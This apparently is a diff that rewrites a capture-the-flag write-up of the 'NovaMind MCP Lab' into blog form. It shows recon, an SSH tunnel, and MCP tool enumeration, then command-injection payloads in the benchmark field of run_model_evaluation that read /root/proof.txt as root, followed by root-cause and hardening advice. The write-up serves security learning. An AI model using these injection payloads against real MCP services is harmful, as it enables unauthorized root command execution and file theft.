@@ -4,105 +4,94 @@ draft: true
 
 # بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
 
-> Metadata intentionally omitted (you said you'll add it later).
+# NovaMind MCP Lab (Technical Blog Version)
 
-# NovaMind MCP Lab — Full Baby-Step Writeup (English)
+> Metadata intentionally omitted (you’ll add it later).
 
-## Goal
-Compromise the internal MCP-backed AI service and read the host proof flag.
+## Audience
+Security learners and CTF players who want a clear MCP exploitation flow.
 
-Final result:
-
-```text
-flag_c107872d_c540_4afa_96b0_2c45cf71f116
-```
+## Final Flag
+`flag_c107872d_c540_4afa_96b0_2c45cf71f116`
 
 ---
 
-## 0) Why this approach
-The challenge description points to a custom MCP server behind an AI assistant platform.
-So the practical plan is:
-1. Identify MCP endpoint and exposed tools
-2. Test each tool for trust-boundary failures
-3. Pivot from tool abuse to command execution
-4. Read `/root/proof.txt`
+## Executive Summary
+This target exposed an MCP server where one tool (`run_model_evaluation`) accepted unsanitized user input in `benchmark`. That input reached a shell execution path, enabling command injection and host proof extraction.
 
 ---
 
-## 1) Recon
+## Attack Chain
+1. Identify MCP endpoint and supporting services
+2. Enumerate available MCP tools
+3. Test tool trust boundaries
+4. Confirm command injection in `benchmark`
+5. Read `/root/proof.txt`
 
+---
+
+## Step 1 — Recon
 ### Command
 ```bash
 nmap -sC -sV -Pn -p- --min-rate 1200 10.8.0.2
 ```
 
-### Important finding
-Open services included:
-- 22/tcp (SSH)
-- 443/tcp (web UI)
-- 9090/tcp (Uvicorn, MCP)
-- 11434/tcp (Ollama service)
+### Key findings
+- `9090/tcp` (MCP app)
+- `11434/tcp` (model infra)
 
-Why this matters:
-- 9090 looked like the MCP app.
-- 11434 suggested local model infra.
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/recon-services.png`
 
 ---
 
-## 2) MCP endpoint verification
-
+## Step 2 — Verify MCP Transport
 ### Command
 ```bash
 curl -i http://10.8.0.2:9090/mcp
 ```
 
 ### Observation
-Server replied with MCP-style error requiring `text/event-stream`.
+Response indicates MCP transport expectations (event-stream style behavior).
 
-Why this matters:
-- Confirms this is a real MCP transport endpoint.
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/mcp-endpoint-check.png`
 
 ---
 
-## 3) Enumerate tools with mcporter
+## Step 3 — Enumerate Tools (mcporter)
+Because access path was through Kali, we tunneled MCP locally first.
 
-Because access path was through Kali, we used local tunnel:
-
+### Tunnel
 ```bash
 sshpass -p 'kali' ssh -N -L 19090:10.8.0.2:9090 kali@192.168.1.3
 ```
 
-Then list tools:
-
+### Tool listing
 ```bash
 mcporter list http://127.0.0.1:19090/mcp --allow-http --schema --json
 ```
 
-Discovered tools included:
+### Observed tools
 - `search_knowledge_base`
 - `fetch_knowledge_source`
 - `run_model_evaluation`
 - `query_llm_metrics`
 - `check_model_registry`
 
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/tool-enumeration.png`
+
 ---
 
-## 4) Boundary testing each tool
+## Step 4 — Boundary Testing
+### 4.1 URL fetch tool
+`fetch_knowledge_source` blocked private/internal SSRF targets.
 
-### 4.1 SSRF-style checks on URL fetcher
-We tested internal/localhost targets through `fetch_knowledge_source`.
+### 4.2 Evaluation tool
+`run_model_evaluation` looked risky because it accepts freeform string fields.
 
-Result:
-- Internal/private ranges were blocked.
-
-Why this matters:
-- Good control exists there, so likely not the easiest path.
-
-### 4.2 Command injection probing on `run_model_evaluation`
-We tested if input is unsafely passed to shell.
-
-Probe command:
-
+### Injection probe
 ```bash
 mcporter call http://127.0.0.1:19090/mcp.run_model_evaluation --allow-http \
   model_name=smollm2 \
@@ -112,66 +101,63 @@ mcporter call http://127.0.0.1:19090/mcp.run_model_evaluation --allow-http \
   --output json
 ```
 
-Result:
-- Output showed shell-side behavior, proving injection via `benchmark`.
+### Result
+Behavior confirmed shell command injection via `benchmark`.
 
-Why this matters:
-- This is direct code execution as the service user/context.
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/injection-probe-id.png`
 
 ---
 
-## 5) Exploit to read host proof
-
-We expanded payload to print identity + proof paths:
-
+## Step 5 — Proof Extraction
+### Command
 ```bash
 mcporter call http://127.0.0.1:19090/mcp.run_model_evaluation --allow-http \
   model_name=smollm2 \
-  'benchmark=mmlu;echo __START__;whoami;id;uname -a;ls -la /root;cat /root/proof.txt 2>/dev/null;cat /root/flag.txt 2>/dev/null;cat /flag.txt 2>/dev/null;cat /home/local.txt 2>/dev/null;echo __END__' \
+  'benchmark=mmlu;echo __START__;whoami;id;ls -la /root;cat /root/proof.txt 2>/dev/null;echo __END__' \
   subset=all \
   num_samples=1 \
   --output json
 ```
 
-Observed evidence in output:
-- `whoami` -> `root`
+### Evidence
+- `whoami` => `root`
 - `uid=0(root)`
-- `/root/proof.txt` contents printed
+- `/root/proof.txt` contents exposed
+
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/proof-flag-output.png`
+
+### Flag
+`flag_c107872d_c540_4afa_96b0_2c45cf71f116`
 
 ---
 
-## 6) Flag
-```text
-flag_c107872d_c540_4afa_96b0_2c45cf71f116
-```
+## Root Cause
+`benchmark` was handled unsafely and reached shell execution context without strict validation/escaping.
+
+Likely anti-patterns:
+- shell command string concatenation
+- no allowlist for benchmark values
+- no metacharacter filtering
 
 ---
 
-## 7) Root Cause (What + Why)
-
-`run_model_evaluation` accepted user-controlled string (`benchmark`) and executed it in a shell context without safe argument handling.
-
-Typical anti-pattern behind this:
-- string command composition + shell execution
-- no strict allowlist for benchmark values
-- no escaping/quoting isolation
-
-So command separators (`;`) broke out of expected logic and ran arbitrary OS commands.
+## Security Recommendations
+1. Remove shell execution for user-controlled parameters
+2. Use argument-array subprocess calls (no shell)
+3. Allowlist `benchmark` values
+4. Run service as non-root
+5. Apply runtime hardening (seccomp/apparmor/egress controls)
+6. Add explicit payload validation and monitoring
 
 ---
 
-## 8) Defensive Fixes
-1. Never pass user input into shell command strings.
-2. Use safe subprocess invocation with argument arrays (no shell).
-3. Strict allowlist for `benchmark` and other enum-like fields.
-4. Run service with non-root account.
-5. Add runtime egress/exec restrictions + seccomp/apparmor.
-6. Add detection for metacharacters and reject malicious input.
+## Writeup Notes
+- This lab is better demonstrated with **mcporter + Burp screenshots**.
+- Burp is excellent for endpoint/auth evidence; mcporter is better for MCP tool calls.
 
 ---
 
-## 9) Practical Lessons
-- Tool enumeration first saved time.
-- URL-fetch tool looked tempting but was hardened.
-- The real break was parameter injection in a different tool.
-- In MCP ecosystems, each tool is its own trust boundary.
+## Reference PoC
+`/home/pi/.openclaw/workspace/CTFDGSSI/MCP_NovaMind_POC.md`
